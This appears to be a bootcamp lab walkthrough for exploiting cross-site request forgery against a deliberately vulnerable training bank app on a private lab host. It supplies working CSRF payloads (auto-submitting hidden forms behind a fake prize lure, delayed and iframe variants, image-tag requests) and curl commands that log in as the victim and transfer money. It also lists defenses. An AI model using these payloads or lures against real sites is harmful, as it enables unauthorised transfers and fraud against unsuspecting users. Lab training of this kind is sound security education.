# CSRF Lab Walkthrough

> **Lab URL:** http://10.10.61.221/share/ (Victim Bank)
> **Attacker URL:** http://10.10.61.221/evil/ (Attacker Page)
> **Last Verified:** March 2026

---

## Overview

**CSRF (Cross-Site Request Forgery)** is an attack that tricks a victim into performing actions on a web application where they're authenticated, without their knowledge.

In this lab, you'll exploit a banking application that lacks CSRF protection to transfer money from a victim's account without their consent.

---

## Lab Architecture

```
┌─────────────────┐         ┌─────────────────┐
│   Victim Bank   │         │  Attacker Page  │
│    /share/      │◄────────│     /evil/      │
│  (loc_csrf_bank)│  POST   │ (loc_csrf_evil) │
│    Port 5000    │ request │    Port 9999    │
└─────────────────┘         └─────────────────┘
        ▲
        │ Victim is logged in
        │
    ┌───────┐
    │ Alice │
    └───────┘
```

---

## Accounts

### Pre-created Victim
| Username | Password | Account No | Balance |
|----------|----------|------------|---------|
| somchai | password123 | 1001 | ฿1,000,000 |

### Your Account (Register First!)
1. Go to http://10.10.61.221/share/
2. Click "Register"
3. Create your own username/password
4. You'll get account number 1002, 1003, etc.
5. Your account starts with ฿0

**Goal:** Make somchai transfer money to YOUR account!

---

## Step 1: Setup Your Account

1. Go to http://10.10.61.221/share/
2. Click "Register" to create your own account
3. Choose a username and password
4. Note your assigned account number (e.g., 1002)
5. Login with your new account

**Note the transfer form:**
- Recipient account field (account number)
- Amount field
- Submit button

---

## Step 2: Analyze the Transfer Request

1. Open browser DevTools (F12) → Network tab
2. Login as **somchai** (password123) - the victim with ฿1,000,000
3. Make a transfer to your account number
4. Observe the POST request:

```http
POST /share/transfer HTTP/1.1
Host: 10.10.61.221
Content-Type: application/x-www-form-urlencoded
Cookie: session=<somchai_session_cookie>

to_account=1002&amount=10
```

**Vulnerability identified:**
- No CSRF token in the request
- Only relies on session cookie for authentication
- Any page can submit this form if somchai is logged in!

---

## Step 3: Explore the Attacker Page

1. Open a new browser tab (or incognito window)
2. Go to http://10.10.61.221/evil/
3. This is the "Partner Portal" - actually an attacker-controlled page
4. Find the CSRF Payload Builder tool

---

## Step 4: Create the Attack Payload

### Option A: Use the Payload Builder

The `/evil/` page has a built-in CSRF payload builder:

1. Enter target URL: `http://10.10.61.221/share/transfer`
2. Enter recipient: `1002` (YOUR account number)
3. Enter amount: `50000`
4. Generate the payload

### Option B: Manual Payload

Create an HTML file with this content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Congratulations! Click below to claim your prize!</h1>

    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="http://10.10.61.221/share/transfer" method="POST" style="display:none;">
        <input type="hidden" name="to_account" value="1002">  <!-- YOUR account number -->
        <input type="hidden" name="amount" value="50000">
    </form>

    <script>
        // Auto-submit the form when page loads
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

---

## Step 5: Execute the Attack

### Scenario: Social Engineering

1. **Victim (somchai)** is logged into the bank at `/share/`
2. **Attacker (you)** sends somchai a link to the malicious page
3. **Somchai** clicks the link (thinking it's a prize/promotion)
4. **The hidden form auto-submits** to the bank
5. **Somchai's browser sends his session cookie** with the request
6. **Money is transferred to your account** without somchai's knowledge!

### To simulate:

1. Login as **somchai** (password123) at `/share/` - keep this tab open
2. In the same browser, open `/evil/` or your malicious HTML
3. The attack executes automatically
4. Check somchai's balance - money has been transferred to your account!

---

## Step 6: Verify the Attack

1. Go back to http://10.10.61.221/share/
2. Check somchai's balance - it should be reduced from ฿1,000,000
3. Login with YOUR account to verify you received the money

---

## Attack Variations

### 1. Image Tag Attack (GET request)
```html
<img src="http://10.10.61.221/share/transfer?to_account=1002&amount=100" style="display:none">
```
*Only works if the endpoint accepts GET requests (this bank uses POST only)*

### 2. Iframe Attack (Silent)
```html
<iframe src="http://10.10.61.221/evil/csrf-payload.html" style="display:none"></iframe>
```

### 3. XMLHttpRequest (Blocked by CORS)
```javascript
// This would be blocked by Same-Origin Policy
fetch('http://10.10.61.221/share/transfer', {
    method: 'POST',
    body: 'to_account=1002&amount=50000',
    credentials: 'include'
});
```
*Modern browsers block this due to CORS, but form submissions still work!*

---

## Why This Works

1. **Session cookies are sent automatically** - Browser includes cookies for any request to the domain
2. **No CSRF token** - Server doesn't verify request origin
3. **No SameSite cookie attribute** - Cookie is sent on cross-site requests
4. **Form submissions bypass CORS** - Unlike fetch/XHR, forms can submit cross-origin

---

## Defenses (What Should Be Implemented)

| Defense | Description |
|---------|-------------|
| CSRF Tokens | Include unique token in forms, verify on server |
| SameSite Cookies | Set `SameSite=Strict` or `SameSite=Lax` |
| Custom Headers | Require X-Requested-With header (blocked by CORS) |
| Referer Validation | Check Referer header matches expected origin |
| Re-authentication | Require password for sensitive actions |

---

## Quick Verification Commands

```bash
# Test if bank is accessible
curl -s -o /dev/null -w '%{http_code}' http://10.10.61.221/share/

# Test if evil page is accessible
curl -s -o /dev/null -w '%{http_code}' http://10.10.61.221/evil/

# Simulate CSRF attack (without valid session - will fail)
curl -X POST http://10.10.61.221/share/transfer \
  -d "to_account=1002&amount=50000" \
  -b "session=VICTIM_SESSION_COOKIE"
```

---

## Troubleshooting

**Attack not working?**
- Make sure somchai is logged in before visiting the attacker page
- Use the same browser (cookies are per-browser)
- Check DevTools Network tab for errors
- Verify both `/share/` and `/evil/` are accessible

**Session expired?**
- Login again as somchai/password123
- Execute the attack quickly after logging in

---

## Summary

| Step | Action |
|------|--------|
| 1 | Register YOUR account at /share/ |
| 2 | Login as somchai (victim) to analyze transfer request |
| 3 | Create malicious form targeting YOUR account number |
| 4 | Keep somchai logged in, visit /evil/ or malicious page |
| 5 | Form auto-submits with somchai's session |
| 6 | Money transferred to YOUR account without consent |

**Key Takeaway:** Never perform sensitive actions without CSRF protection. Always use CSRF tokens and SameSite cookies!

---

## Detailed Step-by-Step Walkthrough

> **Verified:** March 2026

Follow these exact steps to exploit the CSRF vulnerability.

---

### Step 1: Access the Bank Application

**Open in browser:**
```
http://10.10.61.221/share/
```

You'll see "ThaiBank" login page with Thai language interface.

---

### Step 2: Check Pre-created Victim Account

**Login as somchai:**
- Username: `somchai`
- Password: `password123`

**Verify account details:**
- Account Number: `1001`
- Balance: `฿1,000,000`

This is the victim account we'll steal from!

---

### Step 3: Register Your Attacker Account

1. **Logout** from somchai's account
2. Click **"สมัครสมาชิก"** (Register)
3. Create your account:
   - Username: `attacker` (or any name)
   - Password: `attacker123`
4. Note your assigned account number (e.g., `1002`)
5. Your starting balance: `฿0`

**Goal:** Make somchai transfer ฿50,000 to YOUR account!

---

### Step 4: Analyze the Transfer Form

1. Login as **somchai** again
2. Go to Transfer page
3. Open **DevTools** (F12) → **Network** tab
4. Make a small test transfer
5. Observe the POST request:

```http
POST /share/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJhY2NvdW50X25vIjoi...

to_account=1002&amount=100
```

**Vulnerability identified:**
- ❌ No CSRF token in the form
- ❌ No Referer/Origin validation
- ❌ Session cookie has no SameSite attribute
- ✅ Only relies on session cookie for auth

**This means:** Any website can submit this form if somchai is logged in!

---

### Step 5: Create CSRF Attack Payload

**Option A: Use the Evil Page Builder**

1. Open http://10.10.61.221/evil/
2. In the payload editor, paste:

```html
<!DOCTYPE html>
<html>
<head><title>Congratulations!</title></head>
<body>
  <h1>🎉 You Won ฿100,000! Click to Claim!</h1>
  <p>Processing your reward...</p>

  <!-- Hidden CSRF attack -->
  <form id="csrf" action="http://10.10.61.221/share/transfer" method="POST" style="display:none">
    <input name="to_account" value="1002">
    <input name="amount" value="50000">
  </form>

  <script>
    // Auto-submit after 1 second
    setTimeout(function() {
      document.getElementById('csrf').submit();
    }, 1000);
  </script>
</body>
</html>
```

3. Click **Store** to save the payload
4. Copy the generated URL

**Option B: Local HTML File**

Save the above HTML as `attack.html` and open it in your browser.

---

### Step 6: Execute the Attack

**Scenario simulation:**

1. **Keep somchai logged in** at `/share/` (don't logout!)
2. **In the same browser**, open a new tab
3. Visit the malicious page (evil URL or your attack.html)
4. The hidden form **auto-submits** with somchai's session
5. **Money is transferred** without any user interaction!

---

### Step 7: Verify the Attack Succeeded

**Check somchai's balance:**
1. Go back to http://10.10.61.221/share/dashboard
2. Balance should be reduced by ฿50,000

**Check attacker's balance:**
1. Logout from somchai
2. Login as your attacker account
3. Balance should show ฿50,000!

**Check transaction history:**
You'll see a transaction from 1001 → 1002 for ฿50,000

---

### Attack Results Example

| Account | Before Attack | After Attack | Change |
|---------|---------------|--------------|--------|
| 1001 (somchai) | ฿1,000,000 | ฿950,000 | -฿50,000 |
| 1002 (attacker) | ฿0 | ฿50,000 | +฿50,000 |

**Transaction log:**
```
1001 -> 1002: 50,000.00 baht (transfer) at 2026-03-06 20:21:15
```

---

### Step 8: Understanding Why This Works

```
CSRF Attack Flow:

1. Somchai logs into ThaiBank
   └── Browser stores session cookie for 10.10.61.221

2. Somchai visits attacker's page (evil.com or /evil/)
   └── Page contains hidden form targeting /share/transfer

3. JavaScript auto-submits the hidden form
   └── Browser automatically includes ALL cookies for 10.10.61.221

4. ThaiBank receives the request
   └── Valid session cookie ✓
   └── Valid form data ✓
   └── No CSRF token to check ✗

5. Transfer executes successfully
   └── Somchai's money → Attacker's account
   └── Somchai never clicked "Transfer"!
```

---

### Step 9: Test with curl (Command Line)

**Get somchai's session:**
```bash
curl -s -X POST 'http://10.10.61.221/share/login' \
  -d 'username=somchai&password=password123' \
  -c cookies.txt
```

**Execute CSRF attack:**
```bash
curl -s -X POST 'http://10.10.61.221/share/transfer' \
  -d 'to_account=1002&amount=50000' \
  -b cookies.txt
```

**Check balance:**
```bash
curl -s 'http://10.10.61.221/share/dashboard' -b cookies.txt | grep -o '[0-9,]*\.[0-9]* บาท'
```

---

## Multiple Attack Payloads

### 1. Auto-Submit (Immediate)
```html
<body onload="document.getElementById('f').submit()">
<form id="f" action="http://10.10.61.221/share/transfer" method="POST">
  <input name="to_account" value="1002">
  <input name="amount" value="50000">
</form>
</body>
```

### 2. Delayed Submit (Sneaky)
```html
<script>
setTimeout(function(){
  var f = document.createElement('form');
  f.method = 'POST';
  f.action = 'http://10.10.61.221/share/transfer';
  f.innerHTML = '<input name="to_account" value="1002"><input name="amount" value="50000">';
  document.body.appendChild(f);
  f.submit();
}, 3000); // 3 seconds delay
</script>
```

### 3. Invisible iframe
```html
<iframe name="csrf-frame" style="display:none"></iframe>
<form action="http://10.10.61.221/share/transfer" method="POST" target="csrf-frame">
  <input name="to_account" value="1002">
  <input name="amount" value="50000">
</form>
<script>document.forms[0].submit();</script>
```

### 4. Image Tag (GET only)
```html
<!-- Only works if endpoint accepts GET -->
<img src="http://10.10.61.221/share/transfer?to_account=1002&amount=50000" style="display:none">
```

---

## Quick Test URLs

| Action | URL |
|--------|-----|
| Bank Login | http://10.10.61.221/share/ |
| Bank Dashboard | http://10.10.61.221/share/dashboard |
| Transfer Page | http://10.10.61.221/share/transfer |
| Evil Page | http://10.10.61.221/evil/ |

---

## Troubleshooting

**Attack not working?**
- Ensure somchai is **logged in** before visiting evil page
- Use the **same browser** (cookies are per-browser)
- Check that session cookie hasn't expired
- Verify the account number in your payload is correct

**"Not logged in" error?**
- Session expired - login as somchai again
- Wrong browser/tab - cookies aren't shared across browsers

**Transfer fails?**
- Check if somchai has sufficient balance
- Verify account number exists
- Check browser console for errors

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
